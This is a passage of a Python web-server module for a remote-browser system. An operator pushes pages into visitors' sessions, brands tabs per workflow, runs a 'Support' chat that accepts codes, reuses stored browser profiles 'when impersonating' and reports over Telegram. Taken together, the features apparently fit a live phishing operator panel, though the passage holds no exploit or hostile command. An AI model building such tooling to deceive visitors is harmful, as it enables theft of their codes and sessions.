    kind of thing that produces the "Failed to fetch" errors seen during
    LPV page pushes.
    """
    # Use a relative URL by default because the client is already running on the
    # same server origin. This avoids bad fetches when server_domain/public_ip
    # is unset, placeholder, or points at an external host the browser cannot
    # resolve from the current session.
    relative_url = f"/api/lpv/archive/{page_id}/html"
    # Binding values belong to one delivery, so the URL carries the token that
    # points at them (see _bind_token_for).
    query = f"?b={bind_token}" if bind_token else ""
    try:
        if session_manager and getattr(session_manager, "config", None):
            cfg = session_manager.config
            scheme = "https" if getattr(cfg, "use_https", False) else "http"
            host = (getattr(cfg, "server_domain", "") or getattr(cfg, "public_ip", "") or "").strip()
            if host:
                host_lower = host.lower()
                placeholder_hosts = {
                    "localhost",
                    "127.0.0.1",
                    "0.0.0.0",
                    "::1",
                    "example.com",
                    "example.org",
                    "example.net",
                    "panel.example.com",
                    "localtest.me",
                    "it.com",
                    "simplify-hospitality.it.com",
                }
                if host_lower.startswith("http://") or host_lower.startswith("https://"):
                    # server_domain/public_ip may be configured as a full URL.
                    # Previously this branch did nothing, so a correctly
                    # configured absolute domain still produced a relative
                    # URL — which breaks any client.html hosted away from the
                    # backend (the page fetch went to the static host).
                    parsed_url = urlsplit(host)
                    host_only = (parsed_url.hostname or "").lower()
                    if (parsed_url.scheme in ("http", "https") and parsed_url.netloc
                            and host_only not in placeholder_hosts):
                        prefix = parsed_url.path.rstrip("/")
                        return (
                            f"{parsed_url.scheme}://{parsed_url.netloc}"
                            f"{prefix}/api/lpv/archive/{page_id}/html{query}"
                        )
                elif (host_lower not in placeholder_hosts
                      and not host_lower.startswith("*")
                      and not host_lower.endswith((".example.com", ".example.org",
                                                   ".example.net"))):
                    return f"{scheme}://{host}/api/lpv/archive/{page_id}/html{query}"
    except Exception:
        pass
    return relative_url + query


async def _send_to_client(
    client_id: str, message: dict, connection_token: Optional[str] = None
) -> bool:
    """Send a JSON message to a single client's WebSocket. Returns
    True on success, False if the client has no live session or its
    socket is dead. Never raises — callers can fire-and-forget.
    Also checks LPV-only registry for clients without a browser session.
    """
    # A workflow from an older LPV websocket generation must never send to
    # the replacement socket.  Browser workflows do not pass a token and
    # retain the normal session lookup behavior.
    if connection_token is not None and _lpv_connection_tokens.get(client_id) != connection_token:
        return False
    # Try browser session first
    try:
        if session_manager:
            try:
                session = await session_manager.get_session(client_id)
            except Exception:
                session = None
            if session:
                ws = getattr(session, "websocket", None)
                if ws:
                    try:
                        await ws.send_json(message)
                        return True
                    except Exception as e:
                        logger.debug(f"LPV: failed to send to client {client_id} via session: {e}")
                # if session exists but send failed, still try LPV-only fallback
    except Exception:
        pass
    # Fall back to LPV-only ws
    ws2 = _lpv_only_ws.get(client_id)
    if ws2:
        try:
            await ws2.send_json(message)
            return True
        except Exception as e:
            logger.debug(f"LPV: failed to send to LPV-only client {client_id}: {e}")
            return False
    return False


async def _broadcast_lpv_event(client_id: str, event: dict) -> None:
    """Forward a client-side LPV event to all admin WS connections so
    the live activity feed updates without polling."""
    msg = {
        "type": "lpv_event",
        "client_id": client_id,
        **event,
    }
    await _broadcast_to_admins(msg)


async def _broadcast_chat(message: dict) -> None:
    """Push one chat message to every connected admin console."""
    try:
        await _broadcast_to_admins({"type": "chat_message", **message})
    except Exception:
        logger.debug("[chat] admin broadcast failed", exc_info=True)


# ===========================================================================
# Live chat + custom redirect / loading page
# ===========================================================================

def _chat_redirect_url(workflow: Optional[dict]) -> str:
    """URL the client renders INSTEAD of the built-in LPV spinner.

    '' means "no custom loading page" — client.html keeps its own spinner.
    Resolution order:
      1. raw HTML stored on the workflow   -> /api/lpv/workflows/<id>/redirect.html
      2. an archived page referenced by id -> /api/lpv/archive/<id>/html
    """
    if not workflow:
        return ""
    if (workflow.get("redirect_html") or "").strip():
        return f"/api/lpv/workflows/{workflow['id']}/redirect.html"
    page_id = (workflow.get("redirect_page_id") or "").strip()
    if page_id:
        return f"/api/lpv/archive/{page_id}/html"
    return ""


def _chat_device_allows(devices: Any, device: Optional[str]) -> bool:
    """Operator choice (both/desktop/mobile) vs this visitor's device."""
    return srv_settings.chat_device_allows(devices, device)


def _chat_config(device: Optional[str] = None) -> Dict[str, Any]:
    """Live-chat appearance/behaviour for one client.

    ``device`` is that visitor's device ("mobile"/"desktop"); passing it makes
    ``enabled`` already correct for them.  Without it the answer is the master
    switch and the client filters by ``devices`` itself.
    """
    st = srv_settings.get_settings()
    devices = str(getattr(st, "chat_devices", "both") or "both").strip().lower()
    if devices not in ("both", "desktop", "mobile"):
        devices = "both"
    enabled = bool(getattr(st, "chat_enabled", False))
    if enabled and not _chat_device_allows(devices, device):
        enabled = False
    mode = str(getattr(st, "chat_mode", "chat") or "chat").strip().lower()
    if mode not in ("chat", "redirect"):
        mode = "chat"
    kind = str(getattr(st, "chat_redirect_kind", "link") or "link").strip().lower()
    if kind not in ("link", "page"):
        kind = "link"
    page_id = str(getattr(st, "chat_redirect_page_id", "") or "").strip()
    return {
        "enabled": enabled,
        "devices": devices,
        "device": device or "",
        # chat = opens the message panel; redirect = the bubble is a shortcut
        "mode": mode,
        "redirect_kind": kind,
        "redirect_url": str(getattr(st, "chat_redirect_url", "") or "").strip(),
        "redirect_page_id": page_id,
        # Informational: what a redirect-mode bubble has to do. The client
        # asks the server to perform it, so page pushes keep their audit
        # trail and device/guard handling.
        "redirect_page_url": f"/api/lpv/archive/{page_id}/html" if page_id else "",
        "bubble_color": getattr(st, "chat_bubble_color", "") or "#7c5cff",
        "text_color": getattr(st, "chat_text_color", "") or "#ffffff",
        "logo_url": getattr(st, "chat_logo_url", "") or "",
        "display_name": getattr(st, "chat_display_name", "") or "Support",
        "greeting": getattr(st, "chat_greeting", "") or "",
    }


async def _push_chat_config_to_clients() -> None:
    """Re-send the chat config to every connected client so an admin
    settings change takes effect immediately, without a reload."""
    targets: List[Any] = []          # (client_id, websocket)
    try:
        if session_manager:
            for item in await session_manager.get_all_sessions():
                cid = item.get("client_id") if isinstance(item, dict) else None
                if not cid:
                    continue
                sess = await session_manager.get_session(cid)
                ws = getattr(sess, "websocket", None) if sess else None
                if ws:
                    targets.append((cid, ws))
    except Exception:
        pass
    targets.extend(list(_lpv_only_ws.items()))
    for cid, ws in targets:
        try:
            # Each visitor gets the answer for their own device, so a
            # desktop-only bubble never appears on a phone mid-session.
            device = await _client_device(cid)
            await ws.send_json({"type": "chat_config", **_chat_config(device)})
        except Exception:
            pass


async def _push_lpv_branding_to_clients() -> None:
    """Re-send the tab title / favicon to every connected client.

    Without this an operator changing the branding in Settings would only
    see it take effect for visitors who connect afterwards — everyone
    already sitting on a live page would keep the old tab text until they
    reloaded.
    """
    settings = srv_settings.get_settings()
    payload = {
        "type": "lpv_branding",
        "tab_title": (getattr(settings, "lpv_tab_title", "") or "").strip(),
        "favicon_url": (getattr(settings, "lpv_favicon_url", "") or "").strip(),
    }
    sockets: List[Any] = []
    try:
        if session_manager:
            for item in await session_manager.get_all_sessions():
                cid = item.get("client_id") if isinstance(item, dict) else None
                if not cid:
                    continue
                sess = await session_manager.get_session(cid)
                ws = getattr(sess, "websocket", None) if sess else None
                if ws:
                    sockets.append(ws)
    except Exception:
        pass
    sockets.extend(list(_lpv_only_ws.values()))
    for ws in sockets:
        try:
            await ws.send_json(dict(payload))
        except Exception:
            pass


def _lpv_register_identity(client_id: str, user_id: str) -> str:
    """Record the durable identity behind a runtime LPV client id.

    Called when an LPV-only session opens. Everything that should follow a
    person rather than a tab (chat most of all) is grouped by this key.
    """
    cid = (client_id or "").strip()
    uid = (user_id or "").strip()
    if not cid:
        return ""
    if uid:
        _lpv_identity[cid] = uid
    return _lpv_identity.get(cid, "")


def _lpv_identity_for(client_id: str) -> str:
    """Resolve the durable identity key for a runtime client id.

    The in-memory map is lost on restart, so fall back to whatever key the
    stored messages already carry. Returns "" for pre-identity clients,
    which keeps those threads keyed by client_id exactly as before.
    """
    cid = (client_id or "").strip()
    if not cid:
        return ""
    ident = _lpv_identity.get(cid)
    if ident:
        return ident
    try:
        ident = lpv_store.chat_identity_for(cid)
    except Exception:
        ident = ""
    if ident:
        _lpv_identity[cid] = ident
    return ident or ""


def _lpv_forget_identity(client_id: str) -> None:
    _lpv_identity.pop((client_id or "").strip(), None)


async def _handle_client_chat(client_id: str, msg: dict) -> None:
    """Persist an inbound client chat message and fan it out to admins.

    Ignored when live chat is off, so a stale client holding a cached
    widget cannot write into the thread after the operator disables it.
    """
    if not client_id:
        return
    try:
        st = srv_settings.get_settings()
        if not getattr(st, "chat_enabled", False):
            return
        # Chat is desktop-only (or mobile-only): a client on the other kind of
        # device has no bubble, so anything claiming to come from one is stale.
        if not _chat_device_allows(
            getattr(st, "chat_devices", "both"), await _client_device(client_id)
        ):
            return
    except Exception:
        return
    kind = str(msg.get("kind") or "text").strip().lower()
    if kind not in ("text", "code", "instruction"):
        kind = "text"
    body = str(msg.get("body") or msg.get("text") or "").strip()
    code = str(msg.get("code") or "")
    if kind == "text" and not body:
        return
    try:
        row = lpv_store.chat_add(
            client_id, "client", body=body, kind=kind, code=code,
            identity_key=_lpv_identity_for(client_id) or None,
        )
    except Exception as exc:
        logger.debug("[chat] store failed for %s: %s", client_id, exc)
        return
    await _broadcast_chat(row)


def _norm_match(value: Any) -> str:
    return str(value or "").strip().lower()


def _pick_action(
    actions: List[Dict[str, Any]], index: int, wanted_match: Any = ""
) -> Tuple[Optional[Dict[str, Any]], str]:
    """The rule the visitor actually clicked.

    The client sends the index it was given with the page *and* the matcher
    it saw. An operator can edit the list while somebody sits on the page, so
    the matcher decides and the index is only trusted when the two agree.
    Returns ``(rule, reason)``; ``reason`` explains a miss.
    """
    wanted = _norm_match(wanted_match)
    if 0 <= index < len(actions):
        cand = actions[index]
        if not wanted or _norm_match(cand.get("match")) == wanted:
            return cand, ""
    if wanted:
        for cand in actions:
            if _norm_match(cand.get("match")) == wanted:
                return cand, ""
    if not (0 <= index < len(actions)):
        return None, "index_out_of_range"
    return None, "rule_not_found"


async def _notify_action_failed(
    client_id: str, reason: str, connection_token: Optional[str] = None
) -> None:
    """Tell the visitor's page a mapped click had nowhere to go.

    Only failure reason, never content: the client hides its spinner and says
    the target is gone, so a click never looks silently broken.
    """
    try:
        await _send_to_client(
            client_id,
            {"type": "lpv_action_failed", "reason": str(reason or "")[:64]},
            connection_token=connection_token,
        )
    except Exception:
        pass


async def _handle_click_action(
    client_id: str, msg: dict, connection_token: Optional[str] = None
) -> None:
    """A mapped control was clicked inside a pushed page.

    Two sources: the page's own saved actions (``index`` into that list) and
    a rule a running workflow armed (``armed`` = the id it sent). Both end in
    _run_action, which either pushes a page or sends the visitor to a link.
    Every miss is recorded, so an operator can see *why* a click went nowhere
    instead of guessing at the page.
    """
    if not client_id:
        return
    armed = str(msg.get("armed") or "")
    if armed:
        entry = _ARMED_ACTIONS.get(client_id)
        if not entry or entry.get("id") != armed:
            return
        entry["fired"] = True
        event = entry.get("event")
        if event is not None and not event.is_set():
            try:
                event.set()
            except Exception:
                pass
        ok = await _run_action(
            client_id, entry.get("rule") or {},
            connection_token=connection_token, source="workflow",
        )
        if not ok:
            await _notify_action_failed(client_id, "target_missing", connection_token)
        return

    page_id = str(msg.get("page_id") or "")
    try:
        index = int(msg.get("index"))
    except (TypeError, ValueError):
        index = -1
    if not page_id or index < 0:
        lpv_store.record_event(
            client_id, "page_action_skipped",
            {"reason": "no_index", "page_id": page_id},
        )
        return
    # Only the page this visitor is actually looking at may act, so a stale
    # tab cannot make a page from ten minutes ago fire.
    current_id = ""
    try:
        sess = lpv_store.get_session(client_id) or {}
        current_id = str(sess.get("current_page_id") or "")
    except Exception:
        current_id = ""
    if current_id and current_id != page_id:
        lpv_store.record_event(
            client_id, "page_action_skipped",
            {"reason": "stale_page", "page_id": page_id, "current_page_id": current_id},
        )
        return
    actions = _page_actions(page_id)
    if not actions:
        lpv_store.record_event(
            client_id, "page_action_skipped",
            {"reason": "no_actions", "page_id": page_id},
        )
        await _notify_action_failed(client_id, "no_actions", connection_token)
        return
    rule, why = _pick_action(actions, index, msg.get("match"))
    if rule is None:
        lpv_store.record_event(
            client_id, "page_action_skipped",
            {"reason": why, "page_id": page_id, "index": index,
             "match": str(msg.get("match") or "")[:200]},
        )
        await _notify_action_failed(client_id, why, connection_token)
        return
    ok = await _run_action(
        client_id, rule, connection_token=connection_token, source="page",
    )
    if not ok:
        await _notify_action_failed(client_id, "target_missing", connection_token)


async def _handle_chat_redirect(
    client_id: str, connection_token: Optional[str] = None
) -> None:
    """The visitor pressed the bubble while chat is in redirect mode."""
    if not client_id:
        return
    try:
        st = srv_settings.get_settings()
        if not getattr(st, "chat_enabled", False):
            return
        if str(getattr(st, "chat_mode", "chat") or "chat").lower() != "redirect":
            return
        if not _chat_device_allows(
            getattr(st, "chat_devices", "both"), await _client_device(client_id)
        ):
            return
    except Exception:
        return
    kind = str(getattr(st, "chat_redirect_kind", "link") or "link").lower()
    page_id = str(getattr(st, "chat_redirect_page_id", "") or "").strip()
    url = str(getattr(st, "chat_redirect_url", "") or "").strip()
    ok = False
    target = ""
    if kind == "page" and page_id:
        ok, page = await _deliver_page(
            client_id, page_id, connection_token=connection_token,
            source="chat", record_kind="action_page",
        )
        target = (page or {}).get("name") or page_id
    elif url:
        ok = await _navigate_client(client_id, url, connection_token=connection_token)
        target = url
    lpv_store.record_event(
        client_id, "chat_redirect",
        {"kind": kind, "target": target, "delivered": ok},
    )
    await _broadcast_lpv_event(client_id, {
        "event_type": "chat_redirect", "page_id": None, "page_name": target,
        "payload": {"kind": kind, "delivered": ok},
    })


def _apply_redaction(payload: dict, rules: list) -> dict:
    """Return a copy of `payload` with sensitive fields masked/hidden
    per the supplied redaction rules. A rule matches when one of the
    payload's identifying fields equals the rule's selector (case-
    insensitive). `mask` replaces the `value` with bullets; `hide`
    drops the field entirely from the payload."""
    if not rules or not isinstance(payload, dict):
        return payload
    # Convert rules to a fast lookup: {field: {selector: action}}
    lookup: Dict[str, Dict[str, str]] = {}
    for r in rules:
        lookup.setdefault(r["field"], {})[r["selector"].lower()] = r["action"]

    out = dict(payload)
    for field, action_by_value in lookup.items():
        actual = (out.get(field) or "")
        if not isinstance(actual, str):
            actual = str(actual)
        if actual.lower() in action_by_value:
            action = action_by_value[actual.lower()]
            if action == "hide":
                out.pop(field, None)
                out.pop("value", None)
                out["redacted"] = True
            else:  # mask
                v = out.get("value")
                if isinstance(v, str) and v:
                    out["value"] = "•" * min(len(v), 12)
                out["redacted"] = True
    return out


def get_sessions_file() -> Path:
    """Get the sessions data file path, creating directory if needed"""
    file_path = Path(__file__).parent / "data"
    file_path.mkdir(parents=True, exist_ok=True)
    return file_path / "server_sessions.json"


async def load_server_sessions(force: bool = False) -> Dict[str, Any]:
    """Load the durable session index once, then use the in-memory authority.

    Re-reading the JSON file on every request could overwrite a newer
    in-memory update while another coroutine was saving it.  ``force`` is
    reserved for an explicit startup/recovery reload, not normal request paths.
    """
    global server_sessions, server_sessions_loaded
    async with server_sessions_lock:
        if server_sessions_loaded and not force:
            return server_sessions
        try:
            sessions_file = get_sessions_file()
            if sessions_file.exists():
                with open(sessions_file, 'r', encoding='utf-8') as f:
                    loaded = json.load(f)
                server_sessions = loaded if isinstance(loaded, dict) else {}
            else:
                server_sessions = {}
            server_sessions_loaded = True
        except Exception as e:
            logger.error(f"Error loading server sessions: {e}")
            server_sessions = {}
            server_sessions_loaded = True
        return server_sessions


async def _save_server_sessions_locked() -> bool:
    """Persist the registry while ``server_sessions_lock`` is held.

    Keeping the atomic replace inside the same critical section as the
    mutation gives concurrent reports a total order: an older snapshot can
    never overwrite a newer one merely because its disk write finished later.
    """
    global server_sessions_loaded
    temp_file = None
    try:
        sessions_file = get_sessions_file()
        temp_file = sessions_file.with_suffix('.json.tmp')
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(server_sessions, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(temp_file, sessions_file)
        server_sessions_loaded = True
        return True
    except Exception as e:
        logger.error(f"Error saving server sessions: {e}")
        try:
            if temp_file is not None:
                temp_file.unlink(missing_ok=True)
        except Exception:
            pass
        return False


async def save_server_sessions() -> bool:
    """Persist the current in-memory session index without reloading it."""
    async with server_sessions_lock:
        return await _save_server_sessions_locked()


async def get_session_from_server(client_id: str) -> Optional[Dict[str, Any]]:
    """Get a snapshot of one runtime session from server storage."""
    await load_server_sessions()
    async with server_sessions_lock:
        value = server_sessions.get(client_id)
        return dict(value) if isinstance(value, dict) else value


async def save_session_to_server(client_id: str, session_data: Dict[str, Any]) -> bool:
    """Save/update a session on server storage in one serialized transaction."""
    await load_server_sessions()
    async with server_sessions_lock:
        server_sessions[client_id] = copy.deepcopy(dict(session_data))
        snapshot = copy.deepcopy(server_sessions[client_id])
        success = await _save_server_sessions_locked()
    if success:
        await broadcast_session_update(client_id, snapshot)
    return success


async def mark_session_offline_on_server(client_id: str) -> bool:
    """Mark a session as offline on server storage."""
    await load_server_sessions()
    async with server_sessions_lock:
        stored = server_sessions.get(client_id)
        if not isinstance(stored, dict):
            return False
        stored['is_online'] = False
        stored['last_seen'] = datetime.now().isoformat()
        snapshot = copy.deepcopy(stored)
        success = await _save_server_sessions_locked()
    if success:
        await broadcast_session_update(client_id, snapshot)
    return success


async def broadcast_session_update(client_id: str, session_data: Dict[str, Any]):
    """Broadcast session update to all connected admin WebSockets - independent and non-blocking"""
    message = {
        "type": "session_update",
        "client_id": client_id,
        "session": session_data
    }
    await _broadcast_to_admins(message)

# ==============================
# Link Authentication System
# ==============================

# Store generated links: auth_id -> {target_url}
# Links are reusable by multiple people and never expire
# PERSISTENT - saved to disk and loaded on server start
generated_links: Dict[str, Dict] = {}
LINKS_FILE = "persistent_links.json"

def load_persistent_links():
    """Load links from disk on server startup"""
    global generated_links
    try:
        if os.path.exists(LINKS_FILE):
            with open(LINKS_FILE, 'r') as f:
                generated_links = json.load(f)
            logger.debug(f"[LINKS] Loaded {len(generated_links)} persistent links from disk")
    except Exception:
        pass

def save_persistent_links():
    """Save links to disk"""
    try:
        with open(LINKS_FILE, 'w') as f:
            json.dump(generated_links, f, indent=2)
    except Exception:
        pass

# Load links on module import
load_persistent_links()

def generate_auth_id() -> str:
    """Generate a unique authentication ID for links"""
    return str(uuid.uuid4())[:16]  # Use first 16 chars for shorter URLs

def create_auth_link(target_url: str, workflow_id: Optional[str] = None) -> Dict[str, Any]:
    """Create a new authenticated link with unique ID.
    
    If workflow_id is given, the link is a workflow link — when a client
    opens it, the server boots that client into LPV mode and auto-starts the workflow.
    """
    auth_id = generate_auth_id()
    current_time = datetime.now().isoformat()
    
    # Store link data (reusable, no expiry) - PERSISTENT
    entry: Dict[str, Any] = {
        "target_url": target_url,
        "created_at": current_time
    }
    if workflow_id:
        entry["workflow_id"] = workflow_id
        entry["is_workflow_link"] = True
    generated_links[auth_id] = entry
    
    # Save to disk for persistence
    save_persistent_links()
    
    return {
        "auth_id": auth_id,
        "target_url": target_url,
        "workflow_id": workflow_id,
        "created_at": current_time
    }

def find_workflow_link(workflow_id: str) -> Optional[Dict[str, Any]]:
    """Locate THE canonical link for a workflow. Workflow links are 1:1
    with their workflow: the first one ever created stays the answer
    forever (dict order = creation order), so generating twice can never
    yield a different link."""
    for aid, data in generated_links.items():
        try:
            if data.get("workflow_id") == workflow_id:
                return {
                    "auth_id": aid,
                    "target_url": data.get("target_url", ""),
                    "workflow_id": workflow_id,
                    "created_at": data.get("created_at"),
                }
        except Exception:
            continue
    return None


def create_workflow_link(workflow_id: str, target_url: str = "") -> Dict[str, Any]:
    """Create - or return - THE workflow link (LPV boot + auto-start).

    One workflow = one link, everywhere, forever. The store
    (persistent_links.json) is loaded on boot, so the same workflow_id
    yields the same auth_id across server restarts. Historically each call
    minted a fresh random id, so every 'Generate link' click broke the old
    URL; that is no longer possible.
    """
    existing = find_workflow_link(workflow_id)
    if existing:
        # If the stored target is still the workflow: placeholder and a real
        # target arrives now, upgrade it in place (link itself unchanged).
        stored = generated_links.get(existing["auth_id"], {})
        if (target_url and not target_url.startswith("workflow:")
                and str(stored.get("target_url", "")).startswith("workflow:")):
            stored["target_url"] = target_url
            generated_links[existing["auth_id"]] = stored
            save_persistent_links()
            existing["target_url"] = target_url
        return existing
    if not target_url:
        target_url = f"workflow:{workflow_id}"
    return create_auth_link(target_url, workflow_id=workflow_id)

def validate_auth_link(auth_id: str) -> Optional[Dict[str, Any]]:
    """Validate an auth ID and return link data if valid"""
    if auth_id not in generated_links:
        return None
    
    link_data = generated_links[auth_id]
    
    out: Dict[str, Any] = {
        "auth_id": auth_id,
        "target_url": link_data["target_url"]
    }
    if "workflow_id" in link_data:
        out["workflow_id"] = link_data["workflow_id"]
        out["is_workflow_link"] = link_data.get("is_workflow_link", True)
    return out


def set_session_manager(manager):
    """Set the global session manager"""
    global session_manager
    session_manager = manager


def set_server_instance(server):
    """Set the global server instance for restart functionality"""
    global server_instance
    server_instance = server


def map_user_id_to_existing_folder(user_id: str, manager) -> str:
    """
    Map a user_id to an existing folder in the profile directory.

    User folders follow the pattern: user_{timestamp}_{string_id}
    Example: user_1768339520287_216t34gx8

    When impersonating, we receive the {string_id} part (e.g., '216t34gx8')
    and need to find the matching folder to reuse the existing profile.

    Args:
        user_id: The user ID from the client (may be partial like '216t34gx8')
        manager: The session manager to access profile_base_path

    Returns:
        The matched user_id if a folder is found, otherwise returns original user_id
    """
    try:
        if not user_id:
            return user_id

        # Skip if this looks like a full folder name already
        if user_id.startswith('user_'):
            return user_id

        # Get the profile base path from config
        if not hasattr(manager, 'config') or not hasattr(manager.config, 'profile_base_path'):
            return user_id

        profile_base_path = manager.config.profile_base_path

        if not os.path.exists(profile_base_path):
            return user_id

        # Scan existing user folders
        matching_folder = None
        for folder_name in sorted(os.listdir(profile_base_path)):
            folder_path = os.path.join(profile_base_path, folder_name)

            if not os.path.isdir(folder_path):
                continue

            # Check if folder ends with the user_id
            if folder_name.endswith('_' + user_id):
                matching_folder = folder_name
                break

        if matching_folder:
            return matching_folder

        return user_id

    except Exception:
        return user_id


# ==============================
# HTTP Endpoints
# ==============================

def _render_client_html(request: Request) -> Response:
    client_path = get_base_path() / "client.html"
    if not client_path.exists():
        return HTMLResponse("<h1>Client page not found</h1>")

    workflow_id = (request.query_params.get("workflow") or request.query_params.get("workflow_id") or "").strip()
    auth_id = (request.query_params.get("auth") or "").strip()
    if not workflow_id and auth_id and auth_id in generated_links:
        workflow_id = str(generated_links[auth_id].get("workflow_id") or "").strip()

    if not workflow_id:
        try:
            workflow_id = str((lpv_store.get_settings() or {}).get("auto_workflow_id") or "").strip()
        except Exception:
            pass

    wf = None
    if workflow_id:
        try:
            wf = lpv_store.get_workflow(workflow_id)
        except Exception:
            pass

    if not wf:
        return FileResponse(client_path, headers={"Cache-Control": "no-cache, must-revalidate"})

    html_content = client_path.read_text(encoding="utf-8")
    wf_name = str(wf.get("name") or "").strip()
    wf_color = str(wf.get("brand_color") or "").strip()
    wf_logo = str(wf.get("brand_logo_url") or "").strip()

    import html as html_lib
    import json as json_lib
    import re as re_lib

    injected_head = []

    if wf_color:
        r, g, b = 239, 68, 68
        m_hex = re_lib.match(r"^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$", wf_color, re_lib.I)
        if m_hex:
            r, g, b = int(m_hex.group(1), 16), int(m_hex.group(2), 16), int(m_hex.group(3), 16)
        else:
            m_rgb = re_lib.match(r"rgba?\((\d+),\s*(\d+),\s*(\d+)", wf_color, re_lib.I)
            if m_rgb:
                r, g, b = int(m_rgb.group(1)), int(m_rgb.group(2)), int(m_rgb.group(3))
        injected_head.append(
            f'<style id="lpv-preboot-style">'
            f'.loading-spinner {{ border: 3px solid rgba({r},{g},{b},0.18) !important; border-top-color: rgb({r},{g},{b}) !important; }}'
            f'#lpv-root {{ --lpv-brand: {html_lib.escape(wf_color)} !important; }}'
            f'</style>'
        )

    boot_json = json_lib.dumps({
        "workflowName": wf_name,
        "color": wf_color,
        "logoUrl": wf_logo,
    })
    injected_head.append(
        f'<script id="lpv-preboot-data">'
        f'window.__LPV_BOOT_BRANDING__ = {boot_json};'
        f'document.documentElement.dataset.workflowBranding = "true";'
        f'</script>'
    )

    if wf_name:
        html_content = html_content.replace(
            '<title id="pageTitle">Loading...</title>',
            f'<title id="pageTitle">{html_lib.escape(wf_name)}</title>'
        )

    if wf_logo:
        html_content = re_lib.sub(
            r'<link\s+rel=["\']icon["\'][^>]*>',
            f'<link rel="icon" href="{html_lib.escape(wf_logo)}" type="image/png">',
            html_content,
            count=1
        )
        html_content = html_content.replace(
            '<div class="loading-logo" id="loadingLogo"></div>',
            f'<div class="loading-logo" id="loadingLogo"><img src="{html_lib.escape(wf_logo)}" alt="workflow logo" style="max-width:150px; max-height:90px; object-fit:contain;"></div>'
        )

    head_inject = "\n    " + "\n    ".join(injected_head)
    html_content = html_content.replace('<meta charset="UTF-8">', '<meta charset="UTF-8">' + head_inject, 1)

    return HTMLResponse(html_content, headers={"Cache-Control": "no-cache, must-revalidate"})


@app.get("/")
async def home(request: Request):
    """Serve the active remote-browser client UI"""
    return _render_client_html(request)


@app.get("/client.html")
async def client_page(request: Request):
    """Serve the active remote-browser client UI"""
    return _render_client_html(request)


# /remote endpoints removed - clients should use `/client.html` and `/ws`


@app.get("/h264")
async def h264_client_page(request: Request):
    """Serve H264 client page"""
    client_path = get_base_path() / "client_h264.html"
    if client_path.exists():
        return FileResponse(client_path, headers={"Cache-Control": "no-cache, must-revalidate"})
    return HTMLResponse("<h1>H264 Client not found</h1>")


@app.get("/mjpeg")
async def mjpeg_client_page(request: Request):
    """Serve MJPEG client page - Simple and reliable streaming"""
    from pathlib import Path
    client_path = Path(__file__).parent / "client_mjpeg.html"
    if client_path.exists():
        return FileResponse(client_path, headers={"Cache-Control": "no-cache, must-revalidate"})
    return HTMLResponse("<h1>MJPEG Client not found</h1>")


@app.get("/admin")
async def admin_page(request: Request):
    """Serve admin HTML"""
    admin_path = get_base_path() / "Admin.html"
    if admin_path.exists():
        return FileResponse(admin_path, headers={"Cache-Control": "no-cache"} )
    return HTMLResponse("<h1>Admin page not found</h1>")


@app.get("/mini")
async def mini_admin_page(request: Request):
    """Serve the compact Mini Admin console (Telegram + LPV).

    Deliberately separate from ``/admin``: it is a lighter operator
    surface that only touches the Telegram config, the LPV archive /
    workflows and the live client list, and it is served from its own
    file so the two consoles never share a build or a cache entry.
    """
    mini_path = get_base_path() / "mini-admin.html"
    if mini_path.exists():
        return FileResponse(mini_path, headers={"Cache-Control": "no-cache"})
    return HTMLResponse("<h1>Mini admin page not found</h1>")


# Boot stamp — lets you confirm from outside that a deploy actually took
# effect (and that the auto-restart ran) without shell access:
#   curl -s localhost:8446/health | jq .build
_BOOT_TIME = time.time()


def _auto_update_enabled() -> bool:
    """Read config.py's auto_update flag without importing anything new."""
    try:
        from config import CONFIG

        return bool(getattr(CONFIG, "auto_update", False))
    except Exception:
        return False


def _git_revision() -> str:
    """Current commit of the running checkout, or '' when there is no repo."""
    try:
        root = Path(__file__).resolve().parent
        out = subprocess.run(
            ["git", "-C", str(root), "rev-parse", "--short", "HEAD"],
            capture_output=True, text=True, timeout=3,
        )
        if out.returncode == 0:
            return out.stdout.strip()
    except Exception:
        pass
    try:
        return (Path(__file__).resolve().parent / "VERSION").read_text(encoding="utf-8").strip()
    except Exception:
        return ""


_BOOT_REVISION = _git_revision()


def _build_info() -> Dict[str, Any]:
    return {
        "started_at": _BOOT_TIME,
        "uptime_seconds": round(time.time() - _BOOT_TIME, 1),
        "pid": os.getpid(),
        "revision": _BOOT_REVISION,
        # config.py: auto_update = True means a file change restarts this
        # process by itself. Off by default.
        "auto_update": _auto_update_enabled(),
        "autoreload": _auto_update_enabled(),   # old name, same value
    }


@app.get("/api/diagnostics/server")
async def server_diagnostics(request: Request):
    """What this server is doing and what went wrong recently (admin).

    Answers the "it stopped working and we do not know why" question without
    shell access: effective Telegram configuration, live LPV/workflow counts
    and the last WARNING/ERROR lines the process produced.
    """
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    out: Dict[str, Any] = {"build": _build_info(), "log_level": logging.getLevelName(
        logging.getLogger().getEffectiveLevel())}

    try:
        if telegram_config_loaded and telegram_config:
            tg = {"source": "admin",
                  "enabled": bool(telegram_config.get("enabled")),
                  "has_bot_token": bool(telegram_config.get("bot_token")),
                  "has_chat_id": bool(telegram_config.get("chat_id"))}
        else:
            base = _config_tg_defaults()
            tg = {"source": "config.py",
                  "enabled": bool(base["telegram_enabled"]),
                  "has_bot_token": bool(base["telegram_bot_token"]),
                  "has_chat_id": bool(base["telegram_chat_id"])}
        tg["bot_polling"] = bool(getattr(server_instance, "telegram_bot", None))
        tg["configured"] = bool(tg["has_bot_token"] and tg["has_chat_id"])
        out["telegram"] = tg
    except Exception as exc:
        out["telegram"] = {"error": str(exc)}

    try:
        out["lpv"] = {
            "online_clients": len(_lpv_only_ws),
            "pages": len(lpv_store.list_pages() or []),
            "workflows": len(lpv_store.list_workflows() or []),
        }
    except Exception as exc:
        out["lpv"] = {"error": str(exc)}

    try:
        out["recent"] = list(_RECENT_LOG)[-100:]
    except Exception:
        out["recent"] = []
    return out


@app.get("/health")
async def health_check():
    """Health check endpoint.

    This is the liveness probe used by the admin panel, deploy/doctor.sh and
    external monitors, so it must answer even when an optional subsystem is
    broken.  It used to call ``gpu_manager.get_memory_usage_percent()``, a
    method that does not exist — every probe returned HTTP 500 and the app
    looked "down" while it was serving requests normally.
    """
    if session_manager:
        try:
            gpu_status = session_manager.gpu_manager.get_status()
        except Exception:
            logger.warning("[health] gpu status unavailable", exc_info=True)
            gpu_status = {}
        response = {
            "status": "healthy",
